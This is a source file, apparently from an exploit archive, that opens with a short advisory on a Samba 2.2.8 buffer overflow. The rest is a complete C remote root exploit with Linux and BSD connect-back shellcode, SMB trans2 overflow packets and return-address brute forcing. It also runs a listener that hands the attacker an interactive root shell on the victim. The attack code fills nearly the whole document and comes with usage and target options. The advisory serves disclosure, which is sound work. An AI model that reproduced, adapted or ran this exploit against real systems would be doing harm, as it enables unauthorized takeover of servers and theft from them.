@@ -1,0 +1,786 @@
+source: http://www.securityfocus.com/bid/7294/info
+  
+A buffer overflow vulnerability has been reported for Samba. The problem occurs when copying user-supplied data into a static buffer. By passing excessive data to an affected Samba server, it may be possible for an anonymous user to corrupt sensitive locations in memory.
+  
+Successful exploitation of this issue could allow an attacker to execute arbitrary commands, with the privileges of the Samba process.
+  
+It should be noted that this vulnerability affects Samba 2.2.8 and earlier. Samba-TNG 0.3.1 and earlier are also affected. 
+
+/*
+ *  Samba Remote Root Exploit by Schizoprenic from Xnuxer-Labs, 2003.
+ *  Using connect back method and brute force mode.
+ *  I just create & modify some code and ripped too :P 
+ *  Create on May, 12st 2003
+ *
+ *  Thanks to eDSee (netric.org), Sambal is nice exploit bro...
+ *  References: trans2root.pl, 0x333hate.c, sambal.c
+ *  This code just for eduction purpose 
+ *
+ *  XNUXER RESEARCH LABORATORY
+ *  Official Site: http://infosekuriti.com
+ *  Contact Email: xnuxer@yahoo.com, xnuxer@hackermail.com
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <netdb.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/select.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/wait.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+char
+linux_connect_back[] =
+    /* fork(), execve sh -c [client] [host to bounce to], term=xterm */
+    "\x31\xc0\x31\xff\xb0\x02\xcd\x80\x39\xc7\x74\x7e\x31\xc0\x50"
+    "\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20"
+    "\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20"
+    "\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20"
+    "\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x89\xe1\x50\x66\x68"
+    "\x2d\x63\x89\xe3\x50\x66\x68\x73\x68\x89\xe0\x57\x51\x53\x50"
+    "\x89\xe1\x31\xc0\x50\x66\x68\x72\x6d\x68\x3d\x78\x74\x65\x68"
+    "\x54\x45\x52\x4d\x89\xe2\x50\x52\x89\xe2\x57\x68\x6e\x2f\x73"
+    "\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80\x31\xc0\xb0"
+    "\x01\xcd\x80"
+
+    /* connect back shellcode (port=0xb0ef) */
+    "\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51"
+    "\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51"
+    "\x68\x41\x42\x43\x44\x66\x68\xb0\xef\xb1\x02\x66\x51\x89\xe7\xb3"
+    "\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
+    "\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
+    "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
+    "\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f"
+    "\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
+    "\x01\xcd\x80";
+
+char
+bsd_connect_back[] =
+    /* fork(), execve sh -c [client] [host to bounce to], term=xterm */
+    "\x31\xc0\x31\xff\xb0\x02\xcd\x80\x39\xc7\x74\x7e\x31\xc0\x50"
+    "\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20"
+    "\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20"
+    "\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20\x68\x20\x20\x20\x20"
+    "\x68\x20\x20\x20\x20\x89\xe1\x50\x66\x68\x2d\x63\x89\xe3\x50"
+    "\x66\x68\x73\x68\x89\xe0\x57\x51\x53\x50\x89\xe1\x31\xc0\x50"
+    "\x66\x68\x72\x6d\x68\x3d\x78\x74\x65\x68\x54\x45\x52\x4d\x89"
+    "\xe2\x50\x52\x89\xe2\x57\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+    "\x69\x89\xe3\x50\x52\x51\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0"
+    "\x01\xcd\x80"
+
+    /* connect back shellcode (port=0xb0ef) */
+    "\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0"
+    "\x61\xcd\x80\x31\xd2\x52\x52\x68\x41\x41\x41\x41\x66\x68\xb0\xef"
+    "\xb7\x02\x66\x53\x89\xe1\xb2\x10\x52\x51\x50\x52\x89\xc2\x31\xc0"
+    "\xb0\x62\xcd\x80\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80"
+    "\x31\xc0\x50\x52\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x52"
+    "\x50\xb0\x5a\xcd\x80\x31\xc0\x43\x53\x52\x50\xb0\x5a\xcd\x80\x31"
+    "\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54"
+    "\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
+
+typedef struct {
+	unsigned char type;
+	unsigned char flags;
+	unsigned short length;
+} NETBIOS_HEADER;
+
+typedef struct {
+	unsigned char protocol[4];
+	unsigned char command;
+	unsigned short status;
+	unsigned char reserved;
+	unsigned char  flags;
+	unsigned short flags2;
+	unsigned char  pad[12];
+	unsigned short tid;
+	unsigned short pid;
+	unsigned short uid;
+	unsigned short mid;
+} SMB_HEADER;
+
+pid_t childs[50];
+int LOOP = 1;
+struct sockaddr_in serv_addr;
+int sock_listen, client;
+int exploit_pid;
+int listen_pid;
+int port_listen = 45295;
+
+void 
+usage(char *prog) 
+{
+int i;
+
+   fprintf(stdout, "Samba < 2.2.8 Remote Root exploit by Schizoprenic\n"
+                   "Connect back method, Xnuxer-Labs, 2003.\n"
+                   "Usage  : %s <type> <victim> <your_ip>\n"
+                   "Targets:\n"
+                   "         0 = Linux\n"
+                   "         1 = FreeBSD/NetBSD\n"
+                   "         2 = OpenBSD 3.0 and prior\n"
+                   "         3 = OpenBSD 3.2 - non-exec stack\n\n", prog);      
+   exit(1);
+}
+
+int 
+Connect(int fd, char *ip, unsigned int port, unsigned int time_out) 
+{
+	/* ripped from no1 */
+
+	int                      flags;
+	int                      select_status;
+	fd_set                   connect_read, connect_write;
+	struct timeval           timeout;
+	int                      getsockopt_length = 0;
+	int                      getsockopt_error = 0;
+	struct sockaddr_in       server;
+	bzero(&server, sizeof(server));
+	server.sin_family = AF_INET;
+	inet_pton(AF_INET, ip, &server.sin_addr);
+	server.sin_port = htons(port);
+
+	if((flags = fcntl(fd, F_GETFL, 0)) < 0) {
+		close(fd);
+    		return -1;
+  	}
+  
+	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {
+		close(fd);
+    		return -1;
+  	}
+  	
+	timeout.tv_sec = time_out;
+	timeout.tv_usec = 0;
+	FD_ZERO(&connect_read);
+	FD_ZERO(&connect_write);
+	FD_SET(fd, &connect_read);
+	FD_SET(fd, &connect_write);
+
+	if((connect(fd, (struct sockaddr *) &server, sizeof(server))) < 0) {
+		if(errno != EINPROGRESS) {
+      			close(fd);
+      			return -1;
+    		}
+  	}
+	else {
+		if(fcntl(fd, F_SETFL, flags) < 0) {
+			close(fd);
+      			return -1;
+    		}
+    		
+		return 1;
+
+	}
+
+	select_status = select(fd + 1, &connect_read, &connect_write, NULL, &timeout);
+
+	if(select_status == 0) {
+		close(fd);
+		return -1;
+
+	}
+
+	if(select_status == -1) {
+		close(fd);
+		return -1;
+	}
+
+	if(FD_ISSET(fd, &connect_read) || FD_ISSET(fd, &connect_write)) {
+		if(FD_ISSET(fd, &connect_read) && FD_ISSET(fd, &connect_write)) {
+			getsockopt_length = sizeof(getsockopt_error);
+
+			if(getsockopt(fd, SOL_SOCKET, SO_ERROR, &getsockopt_error, &getsockopt_length) < 0) {
+				errno = ETIMEDOUT;
+				close(fd);
+				return -1;
+			}
+
+			if(getsockopt_error == 0) {
+				if(fcntl(fd, F_SETFL, flags) < 0) {
+					close(fd);
+					return -1;
+				}
+				return 1;
+		        } 
+
+			else {
+				errno = getsockopt_error;
+				close(fd);
+				return (-1);
+				}
+
+			}
+		}
+	else {
+		close(fd);
+		return 1;
+	}
+
+	if(fcntl(fd, F_SETFL, flags) < 0) {
+		close(fd);
+		return -1;
+	}
+	return 1;
+}
+
+int 
+read_timer(int fd, unsigned int time_out)
+{
+
+	/* ripped from no1 */
+
+	int                      flags;
+	int                      select_status;
+	fd_set                   fdread;
+	struct timeval           timeout;
+
+	if((flags = fcntl(fd, F_GETFL, 0)) < 0) {
+		close(fd);
+		return (-1);
+	}
+
+	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {
+		close(fd);
+		return (-1);
+	}
+
+	timeout.tv_sec = time_out;
+	timeout.tv_usec = 0;
+	FD_ZERO(&fdread);
+	FD_SET(fd, &fdread);
+	select_status = select(fd + 1, &fdread, NULL, NULL, &timeout);
+
+	if(select_status == 0) {
+		close(fd);
+		return (-1);
+	}
+
+	if(select_status == -1) {
+		close(fd);
+		return (-1);
+	}
+  
+	if(FD_ISSET(fd, &fdread)) {
+  
+  		if(fcntl(fd, F_SETFL, flags) < 0) {
+			close(fd);
+      			return -1;
+    		}
+    		
+		return 1;
+	
+	} 
+	else {
+		close(fd);
+		return 1;
+
+	}
+}
+
+int
+write_timer(int fd, unsigned int time_out)
+{
+
+	/* ripped from no1 */
+
+	int                      flags;
+	int                      select_status;
+	fd_set                   fdwrite;
+	struct timeval           timeout;
+
+	if((flags = fcntl(fd, F_GETFL, 0)) < 0) {    
+		close(fd);
+		return (-1);
+	}
+	
+	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {
+		close(fd);
+		return (-1);
+  	}
+  	
+	timeout.tv_sec = time_out;
+	timeout.tv_usec = 0;
+	FD_ZERO(&fdwrite);
+	FD_SET(fd, &fdwrite);
+
+	select_status = select(fd + 1, NULL, &fdwrite, NULL, &timeout);
+
+	if(select_status == 0) {
+		close(fd);
+		return -1;
+	}
+	
+	if(select_status == -1) {
+		close(fd);
+		return -1;
+	}
+
+	if(FD_ISSET(fd, &fdwrite)) {
+		if(fcntl(fd, F_SETFL, flags) < 0) {
+			close(fd);
+			return -1;
+		}
+		return 1;
+	}
+	else { 
+		close(fd);
+		return -1;
+	}
+}
+
+int 
+start_session(int sock)
+{
+	char buffer[1000];
+	char response[4096];
+	char session_data1[] 	= "\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00\x00\x00";
+        char session_data2[] 	= "\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e\x6f\x62\x6f\x64\x79"
+		                  "\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";
+	
+        NETBIOS_HEADER  *netbiosheader;
+        SMB_HEADER      *smbheader;
+
+	memset(buffer, 0x00, sizeof(buffer));
+
+        netbiosheader   = (NETBIOS_HEADER *)buffer;
+        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));
+
+        netbiosheader->type 	= 0x00;         /* session message */
+        netbiosheader->flags 	= 0x00;
+        netbiosheader->length 	= htons(0x2E);
+
+        smbheader->protocol[0] 	= 0xFF;
+        smbheader->protocol[1] 	= 'S';
+        smbheader->protocol[2] 	= 'M';
+        smbheader->protocol[3] 	= 'B';
+        smbheader->command 	= 0x73;         /* session setup */
+        smbheader->flags 	= 0x08;         /* caseless pathnames */
+        smbheader->flags2 	= 0x01;         /* long filenames supported */
+        smbheader->pid 		= getpid() & 0xFFFF;
+	smbheader->uid          = 100;
+        smbheader->mid 		= 0x01;
+
+        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data1, sizeof(session_data1) - 1);
+
+	if(write_timer(sock, 3) == 1)
+		if (send(sock, buffer, 50, 0) < 0) return -1;
+
+	memset(response, 0x00, sizeof(response));
+
+	if (read_timer(sock, 3) == 1)
+		if (read(sock, response, sizeof(response) - 1) < 0) return -1;
+	
+        netbiosheader = (NETBIOS_HEADER *)response;
+        smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));
+
+	//if (netbiosheader->type != 0x00) fprintf(stderr, "+ Recieved a non session message\n");
+
+        netbiosheader   = (NETBIOS_HEADER *)buffer;
+        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));
+
+        memset(buffer, 0x00, sizeof(buffer));
+
+        netbiosheader->type     = 0x00;         /* session message */
+        netbiosheader->flags    = 0x00;
+        netbiosheader->length   = htons(0x3C);
+
+        smbheader->protocol[0]  = 0xFF;
+        smbheader->protocol[1]  = 'S';
+        smbheader->protocol[2]  = 'M';
+        smbheader->protocol[3]  = 'B';
+        smbheader->command      = 0x70;         /* start connection */
+	smbheader->pid          = getpid() & 0xFFFF;
+	smbheader->tid		= 0x00;
+        smbheader->uid          = 100;
+
+	memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data2, sizeof(session_data2) - 1);
+
+        if(write_timer(sock, 3) == 1)
+                if (send(sock, buffer, 64, 0) < 0) return -1;
+
+        memset(response, 0x00, sizeof(response));
+
+        if (read_timer(sock, 3) == 1)
+                if (read(sock, response, sizeof(response) - 1) < 0) return -1;
+
+        netbiosheader = (NETBIOS_HEADER *)response;
+        smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));
+
+        if (netbiosheader->type != 0x00) return -1;
+
+        return 0;
+}
+
+int
+exploit_normal(int sock, unsigned long ret, char *shellcode)
+{
+
+	char buffer[4000];
+        char exploit_data[] =
+                "\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                "\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
+		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                "\x00\x00\x00\x90";
+
+	int i = 0;
+	unsigned long dummy = ret - 0x90;
+
+        NETBIOS_HEADER  *netbiosheader;
+        SMB_HEADER      *smbheader;
+
+	memset(buffer, 0x00, sizeof(buffer));
+
+        netbiosheader   = (NETBIOS_HEADER *)buffer;
+        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));
+
+        netbiosheader->type             = 0x00;         /* session message */
+        netbiosheader->flags            = 0x04;
+        netbiosheader->length           = htons(2096);
+
+        smbheader->protocol[0]          = 0xFF;
+        smbheader->protocol[1]          = 'S';
+        smbheader->protocol[2]          = 'M';
+        smbheader->protocol[3]          = 'B';
+        smbheader->command              = 0x32;         /* SMBtrans2 */
+	smbheader->tid			= 0x01;
+        smbheader->uid                  = 100;
+
+	memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data), 0x90, 3000);
+
+	buffer[1096] = 0xEB;
+	buffer[1097] = 0x70;
+
+	for (i = 0; i < 4 * 24; i += 8) {
+		memcpy(buffer + 1099 + i, &dummy, 4);
+		memcpy(buffer + 1103 + i, &ret,   4);
+	}
+
+        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), 
+			exploit_data, sizeof(exploit_data) - 1);
+	memcpy(buffer + 1800, shellcode, strlen(shellcode));
+
+	if(write_timer(sock, 3) == 1) {
+		if (send(sock, buffer, sizeof(buffer) - 1, 0) < 0) return -1;
+		return 0;
+	}
+
+	return -1;
+}
+
+int
+exploit_openbsd32(int sock, unsigned long ret, char *shellcode)
+{
+        char buffer[4000];
+
+        char exploit_data[] =
+                "\x00\xd0\x07\x0c\x00\xd0\x07\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                "\x00\xd0\x07\x43\x00\x0c\x00\x14\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+                "\x00\x00\x00\x90";
+
+        int i = 0;
+        unsigned long dummy = ret - 0x30;
+        NETBIOS_HEADER  *netbiosheader;
+        SMB_HEADER      *smbheader;
+
+        memset(buffer, 0x00, sizeof(buffer));
+
+        netbiosheader   = (NETBIOS_HEADER *)buffer;
+        smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));
+
+        netbiosheader->type             = 0x00;         /* session message */
+        netbiosheader->flags            = 0x04;
+        netbiosheader->length           = htons(2096);
+
+        smbheader->protocol[0]          = 0xFF;
+        smbheader->protocol[1]          = 'S';
+        smbheader->protocol[2]          = 'M';
+        smbheader->protocol[3]          = 'B';
+        smbheader->command              = 0x32;         /* SMBtrans2 */
+        smbheader->tid                  = 0x01;
+        smbheader->uid                  = 100;
+
+        memset(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER) + sizeof(exploit_data), 0x90, 3000);
+
+	for (i = 0; i < 4 * 24; i += 4)
+		memcpy(buffer + 1131 + i, &dummy, 4);
+		
+        memcpy(buffer + 1127, &ret,      4);
+
+        memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER),
+                        exploit_data, sizeof(exploit_data) - 1);
+
+        memcpy(buffer + 1100 - strlen(shellcode), shellcode, strlen(shellcode));
+
+        if(write_timer(sock, 3) == 1) {
+                if (send(sock, buffer, sizeof(buffer) - 1, 0) < 0) return -1;
+                return 0;
+        }
+
+        return -1;
+}
+
+
+void shell(int sock)
+{
+ fd_set  fd_read;
+ char buff[1024], *cmd="uname -a;id;\n";
+ int n;
+
+ send(sock, cmd, strlen(cmd), 0);
+
+ while(1) {
+  FD_SET(sock,&fd_read);
+  FD_SET(0,&fd_read);
+
+  if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;
+
+  if( FD_ISSET(sock, &fd_read) ) {
+   n=read(sock,buff,sizeof(buff));
+   if (n == 0) {
+       printf ("Connection closed.\n");
+       exit(EXIT_FAILURE);
+   } else if (n < 0) {
+       perror("read remote");
+       exit(EXIT_FAILURE);
+   }
+   write(1,buff,n);
+  }
+
+  if ( FD_ISSET(0, &fd_read) ) {
+    if((n=read(0,buff,sizeof(buff)))<=0){
+      perror ("read user");
+      exit(EXIT_FAILURE);
+    }
+    write(sock,buff,n);
+  }
+ }
+ close(sock); 
+}
+
+void GoAway() 
+{
+   exit(0);
+}
+
+void start_listen()
+{
+FILE *fstat;
+int cpid;
+   
+LISTENER:
+
+  bzero(&serv_addr, sizeof(serv_addr));
+  serv_addr.sin_family=2;
+  serv_addr.sin_addr.s_addr=0;
+  serv_addr.sin_port=htons(port_listen); 
+  sock_listen=socket(2,1,6);
+
+  if(bind(sock_listen,(struct sockaddr *)&serv_addr,16)) 
+  {   
+      port_listen++;
+      goto LISTENER;       
+  }
+   
+  if(listen(sock_listen,1)) 
+  {
+      perror("listen");
+      exit(1);
+  }
+   
+  fprintf(stdout, "[+] Listen on port: %d\n",port_listen);
+   
+  cpid = fork();
+ 
+  if (cpid) {
+     client=accept(sock_listen,0,0);
+     LOOP = 0;
+     kill(SIGUSR2, exploit_pid);
+     if (client > 0) {
+        fprintf(stdout, "[+] Yeah, I have a root ....!\n"
+                      "------------------------------\n");
+        fstat=fopen(".ROOT", "a");  //needed by mass.c
+        fclose(fstat);
+        shell(client);
+     }
+     exit(0);
+  }
+}
+
+int
+main (int argc,char *argv[])
+{
+   char *shellcode = NULL;
+   int typeos	= -1;
+   int port		= 139;
+   int sock		= 0;
+   int i		= 0;
+   int status	= 0;
+   int m		= 0;
+   int ip1		= 0;
+   int ip2		= 0;
+   int ip3		= 0;
+   int ip4		= 0;
+   int sta		= 0;
+   int STEPS	= 512;
+   int ENDLOOP    = 64;
+   char *desc; 
+   unsigned long MAX_CHILDS  = 40;
+   unsigned long ret         = 0x0;
+   unsigned short int  a_port;
+   struct sockaddr_in addr1;
+   struct hostent *he;
+   struct stat st;
+   
+      if (argc != 4) usage(argv[0]);
+   
+      typeos = atoi(argv[1]);
+      if (typeos > 3) {
+          fprintf(stdout, "Os type out of list!\n");
+          exit(1);
+      }
+
+      he = gethostbyname(argv[2]);
+
+      if (he == NULL) {
+          fprintf(stderr, "Unable to resolve\n");
+          return -1;
+      }
+
+      listen_pid = getpid();
+      start_listen();
+      exploit_pid = listen_pid + 1;
+
+      //fprintf(stdout, "[+] Listen pid: %d, exploit pid: %d\n", listen_pid,exploit_pid);
+
+      sscanf(argv[3], "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);		
+      linux_connect_back[171] = ip1; bsd_connect_back[162] = ip1;
+      linux_connect_back[172] = ip2; bsd_connect_back[163] = ip2;
+      linux_connect_back[173] = ip3; bsd_connect_back[164] = ip3;
+      linux_connect_back[174] = ip4; bsd_connect_back[165] = ip4;
+				
+      fprintf(stdout, "[+] Connecting back to: [%d.%d.%d.%d:%d]\n", 
+					ip1, ip2, ip3, ip4, port_listen);
+
+      a_port = htons(port_listen);
+      
+      linux_connect_back[177]= (a_port) & 0xff;
+      linux_connect_back[178]= (a_port >> 8) & 0xff;
+      bsd_connect_back[168]= (a_port) & 0xff;
+      bsd_connect_back[169]= (a_port >> 8) & 0xff;
+
+      switch(typeos) {
+      case 0:
+              desc = "Linux";
+              ret = 0xc0000000;
+              shellcode = linux_connect_back;
+              break;
+      case 1:
+              desc = "FreeBSD/NetBSD";
+              ret = 0xbfc00000;
+              shellcode = bsd_connect_back;
+              break;
+      case 2:
+              desc = "OpenBSD 3.1 and prior";
+              ret = 0xdfc00000;
+              shellcode = bsd_connect_back;
+              break;
+      case 3:
+              desc = "OpenBSD 3.2 non-exec stack";
+              ret = 0x00170000;
+              shellcode = bsd_connect_back;
+              break;
+      }
+
+      fprintf(stdout, "[+] Target: %s\n", desc);
+      memcpy(&addr1.sin_addr, he->h_addr, he->h_length);
+
+      addr1.sin_family = AF_INET;
+      addr1.sin_port	 = htons(port);	
+
+      fprintf(stdout, "[+] Connected to [%s:%d]\n", (char *)inet_ntoa(addr1.sin_addr), port);
+      fprintf(stdout, "[+] Please wait in seconds...!\n");
+
+      signal(SIGUSR2, GoAway);
+   
+      for (i = 0; i < 50; i++) childs[i] = -1;
+      i = 0; m = 0;
+
+      while (LOOP) {
+
+           if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {
+              fprintf(stderr, "[+] socket() error.\n");
+              exit(-1);
+           }
+
+           ret -= STEPS; i++;
+           if ((ret & 0xff) == 0x00 && typeos != 3) ret++;             
+
+           m++; 
+           //fflush(0);
+           //fprintf(stdout, "[+] Return Address: 0x%08x [%02d]\n", (unsigned int)ret, m);
+
+           usleep(150000);
+
+           switch (childs[i] = fork()) {
+           case 0:  
+                  if (connect(sock, (struct sockaddr *)&addr1, sizeof(addr1)) == -1) { 
+                      //fprintf(stderr, "[+] connect() error.\n");
+                      close(sock);
+                      exit(-1);
+                  }
+			
+                 start_session(sock);
+                 sleep(3);
+		     		         
+                 if (typeos != 3) {
+                           if (exploit_normal(sock, ret, shellcode) < 0) {
+                              //fprintf(stderr, " -> Failed.\n");
+                              close(sock);
+                              exit(-1);
+                           }
+                 } else {
+                           if (exploit_openbsd32(sock, ret, shellcode) < 0) {
+                              //fprintf(stderr, " -> Failed.\n");
+                              close(sock);
+                              exit(-1);
+                           }
+                  }
+                  sleep(5);
+                  close(sock);
+                  exit(0);
+                  break;
+           case -1:
+                  exit(-1);
+                  break;
+           default:
+                  if (i > MAX_CHILDS - 2) {
+                      wait(&status);
+                      i--;
+                  }
+                  break;
+           } 
+
+           if (m == ENDLOOP) LOOP = 0;
+      } 	   
+
+      if (stat(".ROOT", &st) != -1) 
+         kill(SIGUSR2, listen_pid);
+      else {	
+           fprintf(stdout, "[+] Dohh, exploit failed.\n");
+	   close(client); close(sock_listen);
+           kill(listen_pid, SIGUSR2);
+	   sleep(2);
+	   exit(0);
+      }
+}
